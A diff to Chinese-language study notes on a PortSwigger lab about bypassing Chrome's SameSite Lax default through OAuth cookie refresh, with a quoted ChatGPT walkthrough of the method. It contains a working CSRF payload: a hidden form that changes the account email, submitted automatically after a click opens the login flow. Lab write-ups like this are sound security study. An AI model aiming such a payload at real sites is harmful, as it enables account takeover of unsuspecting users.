@@ -232,26 +232,30 @@ window.onclick = () => {
 
 >[Lab: SameSite Lax bypass via cookie refresh](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-cookie-refresh)
 >
->这个实验就是利用了当访问`/social-login`回自动启动完整的OAuth流。而每次完成OAuth流时，目标站点都会设置一个新的会话cookie，即使已经登录也是如此。借助这个组合拳，实现绕过chrome默认的LAX限制。
+>这个实验就是利用了当访问`/social-login`会自动启动完整的OAuth流。而每次完成OAuth流时，目标站点都会设置一个新的会话cookie，即使已经登录也是如此。借助这个组合拳，实现绕过chrome默认的LAX限制。
 >
 >**payload**
 >
 >```js
 ><form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
->    <input type="hidden" name="email" value="pwned@portswigger.net">
+><input type="hidden" name="email" value="pwned@portswigger.net">
 ></form>
 ><p>Click anywhere on the page</p>
 ><script>
->    window.onclick = () => {
->        window.open('https://YOUR-LAB-ID.web-security-academy.net/social-login');
->        setTimeout(changeEmail, 5000);
->    }
+>window.onclick = () => {
+>   window.open('https://YOUR-LAB-ID.web-security-academy.net/social-login');
+>   setTimeout(changeEmail, 5000);
+>}
 >
->    function changeEmail() {
->        document.forms[0].submit();
->    }
+>function changeEmail() {
+>   document.forms[0].submit();
+>}
 ></script>
 >```
+>
+>**Mymind**
+>
+>逻辑就是先刷新cookie、后提交表单：用于绕过Lax限制。
 >
 >**chatgpt**
 >
@@ -262,32 +266,32 @@ window.onclick = () => {
 >
 >1. **表单定义：**
 >
->   ```html
->   <form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
->       <input type="hidden" name="email" value="pwned@portswigger.net">
->   </form>
->   ```
+>  ```html
+>  <form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
+>      <input type="hidden" name="email" value="pwned@portswigger.net">
+>  </form>
+>  ```
 >
->   这是一个隐藏的表单，使用 `POST` 方法提交到指定的 URL `'https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email'`。表单包含一个隐藏的输入字段，名称为 `email`，其值为 `"pwned@portswigger.net"`。
+>  这是一个隐藏的表单，使用 `POST` 方法提交到指定的 URL `'https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email'`。表单包含一个隐藏的输入字段，名称为 `email`，其值为 `"pwned@portswigger.net"`。
 >
 >2. **点击事件绑定：**
 >
->   ```js
->   <script>
->       window.onclick = () => {
->           window.open('https://YOUR-LAB-ID.web-security-academy.net/social-login');
->           setTimeout(changeEmail, 5000);
->       }
->   
->       function changeEmail() {
->           document.forms[0].submit();
->       }
->   </script>
->   ```
+>  ```js
+><script>
+>    window.onclick = () => {
+>    window.open('https://YOUR-LAB-ID.web-security-academy.net/social-login');
+>    setTimeout(changeEmail, 5000);
+>}
 >
->   这部分 JavaScript 代码设置了一个点击事件处理程序。当页面的任意位置被点击时，首先打开了一个新窗口，访问了 `'https://YOUR-LAB-ID.web-security-academy.net/social-login'`。然后，通过 `setTimeout` 函数，等待了5秒钟（5000毫秒），之后调用了 `changeEmail` 函数。
+>function changeEmail() {
+>    document.forms[0].submit();
+>}
+></script>
+>  ```
 >
->   在 `changeEmail` 函数中，通过 `document.forms[0].submit()` 来自动提交位于页面中的第一个表单，即上述定义的隐藏表单。这样，相当于在5秒钟后自动向指定的 URL 提交了一个带有预设邮箱的 POST 请求。
+>  这部分 JavaScript 代码设置了一个点击事件处理程序。当页面的任意位置被点击时，首先打开了一个新窗口，访问了 `'https://YOUR-LAB-ID.web-security-academy.net/social-login'`。然后，通过 `setTimeout` 函数，等待了5秒钟（5000毫秒），之后调用了 `changeEmail` 函数。
+>
+>  在 `changeEmail` 函数中，通过 `document.forms[0].submit()` 来自动提交位于页面中的第一个表单，即上述定义的隐藏表单。这样，相当于在5秒钟后自动向指定的 URL 提交了一个带有预设邮箱的 POST 请求。
 
 ### 绕过基于Referer的CSRF防御
 
